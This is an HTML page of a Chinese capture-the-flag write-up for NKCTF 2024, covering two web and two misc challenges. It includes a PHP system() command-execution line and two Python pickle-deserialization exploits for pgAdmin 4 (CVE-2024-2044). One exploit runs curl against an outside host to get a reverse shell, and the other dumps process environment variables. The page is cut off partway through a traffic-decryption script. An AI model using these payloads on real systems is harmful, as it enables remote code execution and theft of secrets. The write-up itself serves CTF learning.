@@ -1,0 +1,505 @@
+
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="robots" content="noodp" />
+    <title>20024NKCTF - Sc0fie1d</title><meta name="Description" content="scofield&#39;s blog"><meta property="og:title" content="20024NKCTF" />
+<meta property="og:description" content="真遗憾今年没抽到贴纸" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://scofield1920.github.io/2024nkctf/" /><meta property="og:image" content="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2024-03-24T00:00:00+08:00" />
+<meta property="article:modified_time" content="2024-03-24T00:00:00+08:00" /><meta property="og:site_name" content="Hugo DoIt Theme Documentation" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:image" content="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico" /><meta name="twitter:title" content="20024NKCTF"/>
+<meta name="twitter:description" content="真遗憾今年没抽到贴纸"/>
+<meta name="application-name" content="scofield-blog">
+<meta name="apple-mobile-web-app-title" content="scofield-blog">
+
+<meta name="theme-color" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="http://scofield1920.github.io/2024nkctf/" /><link rel="prev" href="http://scofield1920.github.io/script_for_goods/" /><link rel="next" href="http://scofield1920.github.io/nullcon_hackim_ctf_berlin_2024/" />
+<link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/color.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/fontawesome-free/all.min.css">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/animate/animate.min.css">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><meta name="google-site-verification" content="MQ8DNu27ayX6B_4ObiEDK09vGr1fdy7kOAnbd09hJk4" /><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "20024NKCTF",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/scofield1920.github.io\/2024nkctf\/"
+        },"image": ["http:\/\/scofield1920.github.io\/images\/Apple-Devices-Preview.png"],"genre": "posts","keywords": "wp","wordcount":  302 ,
+        "url": "http:\/\/scofield1920.github.io\/2024nkctf\/","datePublished": "2024-03-24T00:00:00+08:00","dateModified": "2024-03-24T00:00:00+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "xxxx","logo": {
+                    "@type": "ImageObject",
+                    "url": "http:\/\/scofield1920.github.io\/images\/avatar.webp",
+                    "width":  528 ,
+                    "height":  560 
+                }},"author": {
+                "@type": "Person",
+                "name": "Sc0fie1d"
+            },"description": ""
+    }
+    </script><script src="//instant.page/5.2.0" defer type="module" integrity="sha384-jnZyxPjiipYXnSU0ygqeac2q7CVYMbh84q0uHVRRxEtvFPiQYbXWUorga2aqZJ0z"></script>
+</head>
+
+<body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">
+        function setTheme(theme) {document.body.setAttribute('theme', theme); document.documentElement.style.setProperty('color-scheme', theme === 'light' ? 'light' : 'dark'); window.theme = theme;   window.isDark = window.theme !== 'light' }
+        function saveTheme(theme) {window.localStorage && localStorage.setItem('theme', theme);}
+        function getMeta(metaName) {const metas = document.getElementsByTagName('meta'); for (let i = 0; i < metas.length; i++) if (metas[i].getAttribute('name') === metaName) return metas[i]; return '';}
+        if (window.localStorage && localStorage.getItem('theme')) {let theme = localStorage.getItem('theme');theme === 'light' || theme === 'dark' || theme === 'black' ? setTheme(theme) : (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light')); } else { if ('auto' === 'light' || 'auto' === 'dark' || 'auto' === 'black') setTheme('auto'), saveTheme('auto'); else saveTheme('auto'), window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light');}
+        let metaColors = {'light': '#f8f8f8','dark': '#252627','black': '#000000'}
+        getMeta('theme-color').content = metaColors[document.body.getAttribute('theme')];
+        window.switchThemeEventSet = new Set()
+    </script>
+    <div id="back-to-top"></div>
+    <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Sc0fie1d"><span class="header-title-pre"><i class='far fa-edit fa-fw'></i></span><span id="desktop-header-typeit" class="typeit"></span></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/links/"> Links </a><a class="menu-item" href="/about/"> About </a><a class="menu-item" href="https://github.com/scofield1920" title="GitHub" rel="noopener noreferrer" target="_blank"><i class='fab fa-github fa-fw'></i>  </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-select" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw"></i>
+                    <select class="color-theme-select" id="theme-select-desktop" title="Switch Theme">
+                        <option value="light">Light</option>
+                        <option value="dark">Dark</option>
+                        <option value="black">Black</option>
+                        <option value="auto">Auto</option>
+                    </select>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Sc0fie1d"><span class="header-title-pre"><i class='far fa-edit fa-fw'></i></span><span id="mobile-header-typeit" class="typeit"></span></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/links/" title="">Links</a><a class="menu-item" href="/about/" title="">About</a><a class="menu-item" href="https://github.com/scofield1920" title="GitHub" rel="noopener noreferrer" target="_blank"><i class='fab fa-github fa-fw'></i></a><a href="javascript:void(0);" class="menu-item theme-select" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw"></i>
+                <select class="color-theme-select" id="theme-select-mobile" title="Switch Theme">
+                    <option value="light">Light</option>
+                    <option value="dark">Dark</option>
+                    <option value="black">Black</option>
+                    <option value="auto">Auto</option>
+                </select>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+            <div class="container"><div class="toc" id="toc-auto">
+        <h2 class="toc-title">Contents</h2>
+        <div class="toc-content" id="toc-content-auto"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#web">web</a>
+      <ul>
+        <li><a href="#my-first-cms">[my first cms]</a></li>
+        <li><a href="#attack_tacooooo">[attack_tacooooo]</a></li>
+      </ul>
+    </li>
+    <li><a href="#misc">misc</a>
+      <ul>
+        <li><a href="#signin">[signin]</a></li>
+        <li><a href="#webshell_pro">[Webshell_pro]</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+    </div><script>document.getElementsByTagName("main")[0].setAttribute("autoTOC", "true")</script><article class="page single"><h1 class="single-title animate__animated animate__flipInX">20024NKCTF</h1><div class="post-meta">
+            <div class="post-meta-line">
+                <span class="post-author"><span class="author fas fa-user-circle fa-fw"></span><a href="/" title="Author" rel=" author" class="author">Sc0fie1d</a>
+                </span>&nbsp;<span class="post-category">included in </span>&nbsp;<span class="post-category">category <a href="/categories/wp/"><i class="far fa-folder fa-fw"></i>Wp</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2024-03-24">2024-03-24</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="2024-03-24">2024-03-24</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;302 words&nbsp;<i class="far fa-clock fa-fw"></i>&nbsp;2 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#web">web</a>
+      <ul>
+        <li><a href="#my-first-cms">[my first cms]</a></li>
+        <li><a href="#attack_tacooooo">[attack_tacooooo]</a></li>
+      </ul>
+    </li>
+    <li><a href="#misc">misc</a>
+      <ul>
+        <li><a href="#signin">[signin]</a></li>
+        <li><a href="#webshell_pro">[Webshell_pro]</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>真遗憾今年没抽到贴纸</p>
+<h2 id="web" class="headerLink">
+    <a href="#web" class="header-mark"></a>web</h2><h3 id="my-first-cms" class="headerLink">
+    <a href="#my-first-cms" class="header-mark"></a>[my first cms]</h3><p>考点cve</p>
+<p>cms made simple 2.2.19</p>
+<p><a href="https://github.com/capture0x/CMSMadeSimple" target="_blank" rel="noopener noreferrer">GitHub - capture0x/CMSMadeSimple</a></p>
+<p>后台扫描发现登录页面<code>/admin/login.php</code></p>
+<p>弱口令<code>admin/Admin123</code></p>
+<p>命令执行：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?php echo system(&#39;cat /_fffff1@g&#39;); ?&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240325001938779.png?imageSlim" title="image-20240325001938779" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240325001938779.png?imageSlim">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240325001938779.png?imageSlim"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240325001938779.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240325001938779.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240325001938779.png?imageSlim 2x"
+            sizes="auto"
+            alt="image-20240325001938779">
+    </a></figure></p>
+<h3 id="attack_tacooooo" class="headerLink">
+    <a href="#attack_tacooooo" class="header-mark"></a>[attack_tacooooo]</h3><p><code>tacooooo@qq.com/tacooooo</code>登录<code>pgadmin4</code></p>
+<p>右下角有提示</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240325003958443.png?imageSlim" title="image-20240325003958443" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240325003958443.png?imageSlim">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240325003958443.png?imageSlim"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240325003958443.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240325003958443.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240325003958443.png?imageSlim 2x"
+            sizes="auto"
+            alt="image-20240325003958443">
+    </a></figure></p>
+<p>搜索<code>pgadmin4.8.3</code>的漏洞得到</p>
+<ul>
+<li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-2044" target="_blank" rel="noopener noreferrer">CVE-2024-2044</a></li>
+</ul>
+<p>参考：</p>
+<p><a href="https://www.shielder.com/advisories/pgadmin-path-traversal_leads_to_unsafe_deserialization_and_rce/" target="_blank" rel="noopener noreferrer">https://www.shielder.com/advisories/pgadmin-path-traversal_leads_to_unsafe_deserialization_and_rce/</a></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">struct</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">produce_pickle_bytes</span><span class="p">(</span><span class="n">platform</span><span class="p">,</span> <span class="n">cmd</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">b</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x80\x04\x95</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">b</span> <span class="o">+=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s1">&#39;L&#39;</span><span class="p">,</span> <span class="mi">22</span> <span class="o">+</span> <span class="nb">len</span><span class="p">(</span><span class="n">platform</span><span class="p">)</span> <span class="o">+</span> <span class="nb">len</span><span class="p">(</span><span class="n">cmd</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">b</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x8c</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s1">&#39;b&#39;</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">platform</span><span class="p">))</span> <span class="o">+</span> <span class="n">platform</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">b</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x94\x8c\x06</span><span class="s1">system</span><span class="se">\x94\x93\x94</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">b</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x8c</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s1">&#39;b&#39;</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">cmd</span><span class="p">))</span> <span class="o">+</span> <span class="n">cmd</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">b</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x94\x85\x94</span><span class="s1">R</span><span class="se">\x94</span><span class="s1">.&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">b</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">b</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;posix.pickle&#39;</span><span class="p">,</span> <span class="s1">&#39;wb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">produce_pickle_bytes</span><span class="p">(</span><span class="s1">&#39;posix&#39;</span><span class="p">,</span> <span class="sa">f</span><span class="s2">&#34;curl http://</span><span class="si">{</span><span class="n">HOST</span><span class="si">}</span><span class="s2">/&#34;</span><span class="p">))</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>根据流程改cookie值可以反弹shell随后在<code>crontab -e</code>得到flag</p>
+<hr>
+<p>赛后看到另外一个师傅写的script：</p>
+<p>流程跟上面的差不多，改完cookie在文件管理里面有1.txt得到flag</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">struct</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">pickle</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">A</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">(</span><span class="nb">eval</span><span class="p">,(</span><span class="s2">&#34;__import__(&#39;os&#39;).system(&#39;cat /proc/1/environ &gt; /var/lib/pgadmin/storage/tacooooo_qq.com/1.txt&#39;)&#34;</span><span class="p">,))</span>
+</span></span><span class="line"><span class="cl"><span class="n">poc</span> <span class="o">=</span> <span class="n">A</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">result</span> <span class="o">=</span> <span class="n">pickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">poc</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;C:</span><span class="se">\\</span><span class="s1">Users</span><span class="se">\\</span><span class="s1">scofi</span><span class="se">\\</span><span class="s1">Desktop</span><span class="se">\\</span><span class="s1">posix.pickle&#39;</span><span class="p">,</span> <span class="s1">&#39;wb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><a href="https://www.cnblogs.com/gxngxngxn/p/18091636" target="_blank" rel="noopener noreferrer">NKCTF2024-WEB-gxngxngxn - gxngxngxn - 博客园 (cnblogs.com)</a></p>
+<h2 id="misc" class="headerLink">
+    <a href="#misc" class="header-mark"></a>misc</h2><h3 id="signin" class="headerLink">
+    <a href="#signin" class="header-mark"></a>[signin]</h3><p>base解码公众号回复</p>
+<h3 id="webshell_pro" class="headerLink">
+    <a href="#webshell_pro" class="header-mark"></a>[Webshell_pro]</h3><p>流量分析，请求流量是经过加密的，响应包流量可以通过base解码</p>
+<p>在tcp流9得到请求体的加密代码</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240325002220370.png?imageSlim" title="image-20240325002220370" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240325002220370.png?imageSlim">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240325002220370.png?imageSlim"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240325002220370.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240325002220370.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240325002220370.png?imageSlim 2x"
+            sizes="auto"
+            alt="image-20240325002220370">
+    </a></figure></p>
+<p>把加密逆向得到明文，以此对请求包的shell参数进行解密</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">libnum</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.PublicKey</span> <span class="kn">import</span> <span class="n">RSA</span>
+</span></span><span class="line"><span class="cl"><span class="n">pubkey</span> <span class="o">=</span> <span class="s2">&#34;&#34;&#34;-----BEGIN PUBLIC KEY-----
+</span></span></span><span class="line"><span class="cl"><span class="s2">MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCK/qv5P8ixWjoFI2rzF62tm6sDFnRsKsGhVSCuxQIxuehMWQLmv6TPxyTQPefIKufzfUFaca/YHkIVIC19ohmE5X738TtxGbOgiGef4bvd9sU6M42k8vMlCPJp1woDFDOFoBQpr4YzH4ZTR6Ps+HP8VEIJMG5uiLQOLxdKdxi41QIDAQAB
+</span></span></span><span class="line"><span class="cl"><span class="s2">-----END PUBLIC KEY-----
+</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">prikey</span> <span class="o">=</span> <span class="s2">&#34;&#34;&#34;-----BEGIN PRIVATE KEY-----
+</span></span></span><span class="line"><span class="cl"><span class="s2">MIICdgIBADANBgkqhkiG9w0BAQEFAASCAmAwggJcAgEAAoGBAIr+q/k/yLFaOgUjavMXra2bqwMWdGwqwaFVIK7FAjG56ExZAua/pM/HJNA958gq5/N9QVpxr9geQhUgLX2iGYTlfvfxO3EZs6CIZ5/hu932xTozjaTy8yUI8mnXCgMUM4WgFCmvhjMfhlNHo+z4c/xUQgkwbm6ItA4vF0p3GLjVAgMBAAECgYBDsqawT5DAUOHRft6oZ+//jsJMTrOFu41ztrKkbPAUqCesh+4R1WXAjY4wnvY1WDCBN5CNLLIo4RPuli2R81HZ4OpZuiHv81sNMccauhrJrioDdbxhxbM7/jQ6M9YajwdNisL5zClXCOs1/y01+9vDiMDk0kX8hiIYlpPKDwjqQQJBAL6Y0fuoJng57GGhdwvN2c656tLDPj9GRi0sfeeMqavRTMz6/qea1LdAuzDhRoS2Wb8ArhOkYns0GMazzc1q428CQQC6sM9OiVR4EV/ewGnBnF+0p3alcYr//Gp1wZ6fKIrFJQpbHTzf27AhKgOJ1qB6A7P/mQS6JvYDPsgrVkPLRnX7AkEAr/xpfyXfB4nsUqWFR3f2UiRmx98RfdlEePeo9YFzNTvX3zkuo9GZ8e8qKNMJiwbYzT0yft59NGeBLQ/eynqUrwJAE6Nxy0Mq/Y5mVVpMRa+babeMBY9SHeeBk22QsBFlt6NT2Y3Tz4CeoH547NEFBJDLKIICO0rJ6kF6cQScERASbQJAZy088sVY6DJtGRLPuysv3NiyfEvikmczCEkDPex4shvFLddwNUlmhzml5pscIie44mBOJ0uX37y+co3q6UoRQg==
+</span></span></span><span class="line"><span class="cl"><span class="s2">-----END PRIVATE KEY-----
+</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">pubkey</span> <span class="o">=</span> <span class="n">RSA</span><span class="o">.</span><span class="n">import_key</span><span class="p">(</span><span class="n">pubkey</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">prikey</span> <span class="o">=</span> <span class="n">RSA</span><span class="o">.</span><span class="n">import_key</span><span class="p">(</span><span class="n">prikey</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">n</span> <span class="o">=</span> <span class="n">pubkey</span><span class="o">.</span><span class="n">n</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">decrypt</span><span class="p">(</span><span class="n">cipher_text</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 首先，将enc_replace函数中的编码反转</span>
+</span></span><span class="line"><span class="cl">    <span class="n">cipher_text</span> <span class="o">=</span> <span class="n">cipher_text</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;JXWUDuLUgwRLKD9fD6&amp;VY2aFeE&amp;r@Ff2&#34;</span><span class="p">,</span> <span class="s2">&#34;=&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">cipher_text</span> <span class="o">=</span> <span class="n">cipher_text</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;n6&amp;B8G6nE@2tt4UR6h3QBt*5&amp;C&amp;pVu8W&#34;</span><span class="p">,</span> <span class="s2">&#34;+&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">cipher_text</span> <span class="o">=</span> <span class="n">cipher_text</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;e5Lg^FM5EQYe5!yF&amp;62%V$UG*B*RfQeM&#34;</span><span class="p">,</span> <span class="s2">&#34;/&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 然后，解码base64字符串</span>
+</span></span><span class="line"><span class="cl">    <span class="n">cipher_text</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">cipher_text</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 使用公钥解密</span>
+</span></span><span class="line"><span class="cl">    <span class="n">plain_text</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">cipher_text</span><span class="p">),</span> <span class="mi">128</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">part</span> <span class="o">=</span> <span class="n">cipher_text</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span> <span class="o">+</span> <span class="mi">128</span><span class="p">]</span>
